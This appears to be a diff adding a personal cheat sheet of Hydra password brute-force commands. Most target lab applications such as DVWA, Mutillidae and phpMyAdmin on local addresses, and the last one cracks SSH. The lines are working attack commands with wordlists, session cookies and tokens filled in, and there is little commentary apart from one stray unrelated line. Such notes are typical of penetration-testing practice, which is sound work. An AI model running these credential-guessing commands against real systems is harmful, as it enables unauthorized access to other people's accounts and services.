@@ -1,0 +1,25 @@
+
+hydra -l robhubbard -P password.txt 192.168.0.105  http-form-post "/commodore64/index.php:input_username=^USER^&input_password=^PASS^:Login system"
+
+ hydra -t64 -L  ~/opt/db/names.txt -P ~/opt/db/passwds.txt localhost  http-form-post "/login.php?page=login:username=^USER^&password=^PASS^:Login=Login:F=Account does not exist:H=Cookie:PHPSESSID=0c80eca0e405b626a96a77eb4d814f43"
+
+ hydra -l admin -p password  192.168.0.104 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=You have logged in as 'admin':H=Cookie\: security=low; PHPSESSID=${SESSIONID}"
+
+hydra -l admin -p password  192.168.0.104 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&user_token=88f5dd9266d47bbbfc18ef849aabc5d1&Login=Login:S=You have logged in as 'admin':H=Cookie\: security=low;  PHPSESSID=44f4b6a30faab8df66dad625ebcde951"
+
+hydra -l admin -P ~/opt/password.txt -vV  127.0.0.1 http-post-form "/mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:Not Logged In"
+
+hydra -l admin -P password.txt -f -v 191.168.124.123 http-get-form "/dvwa/login.php:username=^USER^&password=^PASS^&submit=Login:Login failed"
+
+hydra -l root -P /opt/wordlists/big.txt -e ns -vV 192.168.56.20 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:denied"
+
+__________this hydra cracked dvwa
+Integer("7cb0",16)
+hydra 127.0.0.1 -V -l admin -P /remotezen/wordlists/big.txt http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: PHPSESSID=lkjnhsemqtdno53qg75uv4d063; security=low"
+
+hydra nullbyte http-post-form "/kzMb5nVYJw/index.php:key=^PASS^&Login:invalid key" -l null -P $PASSLIST
+
+hydra zico http-post-form "/dbadmin/test_db.php:password=^PASS^&remember=yes&submit=Log In&proc_name=true&Login:Incorrect Password" -l null -P $PASSLIST
+
+____________crack ssh
+hydra acid ssh -L username.txt -P username.txt -s 22
